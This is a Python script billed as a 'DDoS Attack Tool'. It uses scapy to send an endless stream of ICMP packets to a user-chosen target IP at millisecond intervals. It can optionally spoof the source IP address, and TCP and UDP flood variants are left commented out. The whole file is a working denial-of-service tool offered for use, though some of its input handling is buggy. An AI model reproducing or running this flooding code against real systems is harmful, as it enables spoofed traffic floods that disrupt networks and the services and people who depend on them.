from curses.ascii import isdigit
from scapy.all import *

is_random_ip = False
is_random_port = False
is_spoof_ip = False

# Check IPv4 format
def validate_ip_address(address):
   parts = address.split(".")

   if len(parts) != 4:
      print("-->IP address {} is not valid".format(address))
      return False

   for part in parts:
      # if not isinstance(int(part), int):
      if part.isdigit() is not True:
         print("-->IP address {} is not valid".format(address))
         return False

      if int(part) < 0 or int(part) > 255:
         print("-->IP address {} is not valid".format(address))
         return False
 
   print("-->IP address {} is valid".format(address))
   return True 

# Check port value
def validate_port_number(port):
   if port.isdigit() is not True:
      print("-->Port is not valid")
      return False

   if int(port) < 0 or int(port) > 65536:
      print("-->Port {} is out of range (0-65536)".format(port))
      return False
   
   print("-->Port {} is valid".format(port))
   return True

# Set source IP
def set_source_ip(is_spoof_ip):
   src_IP = ""
   if is_spoof_ip == 1:
      while True:
         src_IP = input("Enter IP address of Source: ")

         if src_IP == "":
            print("-->Set random IP")
            is_random_ip = True     
            break

         if validate_ip_address(src_IP):
            break
   return src_IP

# Set target IP
def set_target_IP():
   target_IP = ""
   while True:
      target_IP = input("Enter IP address of Target: ")

      if target_IP == "":
         print("-->Target IP address is not valid")   
         continue

      if validate_ip_address(target_IP):
         break
   
   return target_IP

# Set source port
def set_source_port():
   while True:      
      src_port = input("Enter Source Port Number:")
      if src_port == "":
         print("-->Set random port")
         is_random_port = True
         break

      if validate_port_number(src_port):
         break

   return src_port

# Set destination port
def set_destination_port():
   while True:      
      dst_port = input("Enter Destination Port Number:")
      if dst_port == "":
         print("-->Set random port")
         is_random_port = True
         break

      if validate_port_number(dst_port):
         break

      return dst_port

i = 1

def rand_ip():
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."

   rip = a + dot + b + dot + c + dot + d
   
   return rip

def rand_port():
   rport = random.randint(0,65535)

   return rport

print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("-------------------Welcome to DDoS Attack Tool------------------")
print("------------------------Written by TuanNQ-----------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("Do you want to spoof source IP address?")
print("Please choose:")
print("0: No")
print("1: Yes\n")

spoof_ip = 0
while True:
   spoof_ip = input("--> You press: ")
   if (spoof_ip.isdigit() == False or (int(spoof_ip) != 0 and int(spoof_ip) != 1)):
      print("Please choose either 0 or 1!")
      
   else:
      break

source_ip = set_source_ip(is_spoof_ip = int(spoof_ip))
target_ip = set_target_IP()
source_port = set_source_port()
destination_port = set_destination_port()

while True:
   # source_ip = rand_ip()
   # source_port = rand_port()
   IP1 = IP(src = source_ip, dst = target_ip)
   # TCP1 = TCP(sport = source_port, dport = 80)
   # UDP1 = UDP(sport = source_port, dport = destination_port)
   # pkt = IP1 / TCP1
   # pkt = IP1 / UDP1
   pkt = IP1 / ICMP()
   send(pkt,inter = .001)
   print ("packet sent ", i)
   i = i + 1